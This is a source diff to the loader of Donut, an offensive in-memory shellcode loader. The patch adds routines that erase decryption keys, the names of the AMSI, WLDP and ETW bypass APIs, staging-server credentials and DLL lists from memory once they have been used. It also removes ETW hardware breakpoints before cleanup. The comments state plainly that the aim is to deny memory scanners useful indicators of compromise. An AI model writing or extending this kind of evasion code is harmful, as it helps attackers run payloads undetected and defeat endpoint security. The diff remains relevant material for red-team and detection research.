@@ -33,6 +33,9 @@
 
 DWORD MainProc(PDONUT_INSTANCE inst);
 
+// DonutLoader must stay first in .text: exe2h extracts the .text section and
+// the generated shellcode starts executing at its first byte.
+
 HANDLE DonutLoader(PDONUT_INSTANCE inst) {
     CreateThread_t     _CreateThread;
     GetThreadContext_t _GetThreadContext;
@@ -96,6 +99,46 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
       MainProc(inst);
     }
     return h;
+}
+
+// Erase a buffer in a way the compiler cannot turn into a no-op.  The loader
+// keeps keys, evasion API names and configuration flags in ordinary RW memory
+// while the payload runs; clearing them as soon as they are no longer needed
+// removes useful IOCs for memory scanners.
+static void WipeBuffer(void *ptr, size_t len) {
+    volatile unsigned char *p = (volatile unsigned char*)ptr;
+    while(len--) *p++ = 0;
+}
+
+// The instance key, the module key and the MAC inputs are only needed while
+// the instance/module is decrypted and verified.
+static void WipeCrypto(PDONUT_INSTANCE inst) {
+    WipeBuffer(&inst->key,     sizeof(inst->key));
+    WipeBuffer(&inst->mod_key, sizeof(inst->mod_key));
+    WipeBuffer(inst->sig,      sizeof(inst->sig));
+    inst->mac     = 0;
+    inst->iv      = 0;
+    inst->entropy = 0;
+}
+
+// The AMSI/WLDP/ETW names and the bypass level are only needed for the bypass
+// stage.  Reset the flag and wipe the strings afterwards.
+static void WipeEvasion(PDONUT_INSTANCE inst) {
+    WipeBuffer(inst->clr,                sizeof(inst->clr));
+    WipeBuffer(inst->amsi,               sizeof(inst->amsi));
+    WipeBuffer(inst->amsiInit,           sizeof(inst->amsiInit));
+    WipeBuffer(inst->amsiScanBuf,        sizeof(inst->amsiScanBuf));
+    WipeBuffer(inst->amsiScanStr,        sizeof(inst->amsiScanStr));
+    WipeBuffer(inst->wldp,               sizeof(inst->wldp));
+    WipeBuffer(inst->wldpQuery,          sizeof(inst->wldpQuery));
+    WipeBuffer(inst->wldpIsApproved,     sizeof(inst->wldpIsApproved));
+    WipeBuffer(inst->ntdll,              sizeof(inst->ntdll));
+    WipeBuffer(inst->etwEventWrite,      sizeof(inst->etwEventWrite));
+    WipeBuffer(inst->etwTraceEvent,      sizeof(inst->etwTraceEvent));
+    WipeBuffer(inst->ntGetNextThread,    sizeof(inst->ntGetNextThread));
+    WipeBuffer(inst->etwRet64,           sizeof(inst->etwRet64));
+    WipeBuffer(inst->etwRet32,           sizeof(inst->etwRet32));
+    inst->bypass = 0;
 }
 
 DWORD MainProc(PDONUT_INSTANCE inst) {
@@ -183,7 +226,7 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     DPRINT("Resolving LoadLibraryA");
     
     inst->api.addr[0] = xGetProcAddressByHash(inst, inst->api.hash[0], inst->iv);
-    if(inst->api.addr[0] == NULL) return -1;
+    if(inst->api.addr[0] == NULL) goto erase_memory;
     
     str = (PCHAR)inst->dll_names;
     
@@ -199,6 +242,10 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       path[i] = '\0';
       xGetLibAddress(inst, path);
     }
+
+    // the DLL list is no longer needed after the modules are loaded
+    WipeBuffer(inst->dll_names, sizeof(inst->dll_names));
+    WipeBuffer(path, sizeof(path));
     
     DPRINT("Resolving %i API", inst->api_cnt);
     
@@ -238,6 +285,19 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       DPRINT("Module is embedded.");
       mod = (PDONUT_MODULE)&inst->module.x;
     }
+
+    // The instance/module have been decrypted and verified by now.  Drop the
+    // crypto material and any HTTP credentials before the payload starts, so
+    // they do not sit in RW memory for the lifetime of the process.
+    WipeCrypto(inst);
+    if(inst->type == DONUT_INSTANCE_HTTP ||
+       inst->type == DONUT_INSTANCE_DNS)
+    {
+      WipeBuffer(inst->server,   sizeof(inst->server));
+      WipeBuffer(inst->username, sizeof(inst->username));
+      WipeBuffer(inst->password, sizeof(inst->password));
+      WipeBuffer(inst->http_req, sizeof(inst->http_req));
+    }
     
     // try bypassing AMSI, WLDP, and ETW?
     if(inst->bypass != DONUT_BYPASS_NONE) {
@@ -259,6 +319,9 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       if (!disabled && inst->bypass == DONUT_BYPASS_ABORT)
           goto erase_memory;
     }
+
+    // Reset the bypass flag and erase the API names now that evasion is done.
+    WipeEvasion(inst);
     
     // module is compressed?
     if(mod->compress != DONUT_COMPRESS_NONE) {
@@ -340,6 +403,10 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     }
     
 erase_memory:
+    // remove the ETW hardware breakpoints/VEH before the shellcode memory is
+    // released
+    DisableETWCleanup(inst);
+
     // if module was downloaded
     if(inst->type == DONUT_INSTANCE_HTTP || 
        inst->type == DONUT_INSTANCE_DNS) 
